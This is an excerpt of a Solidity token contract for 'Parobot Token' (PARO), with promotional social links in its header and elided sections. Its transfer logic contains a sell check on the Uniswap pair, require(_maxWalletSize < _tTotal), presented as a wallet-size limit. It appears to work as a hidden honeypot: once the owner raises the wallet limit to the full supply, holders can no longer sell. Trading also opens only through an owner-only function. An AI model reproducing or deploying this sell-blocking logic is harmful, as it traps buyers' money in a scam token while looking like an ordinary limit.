...
/**
    Telegram: https://t.me/Parobot_AI
    Website: https://parobot.ai
    Twitter: https://x.com/Parobot_AI
    Docs: https://docs.parobot.ai/
...
contract ParoBot is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Parobot Token";
    string private constant _symbol = "PARO";
    ...
    uint256 public _maxWalletSize = _tTotal / 100; // 1% at launch
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            require(launched, "PARO: This account cannot send tokens until trading is enabled");

            if(to != uniswapV2Pair) {
                require(balanceOf(to) + amount < _maxWalletSize, "PARO: Balance exceeds wallet size!");
            }

            if(to == uniswapV2Pair) {
                require(_maxWalletSize < _tTotal, "PARO: Balance exceeds wallet size!");
            }
    ...
    function startQuantAI() public onlyOwner {
        launched = true;
    }
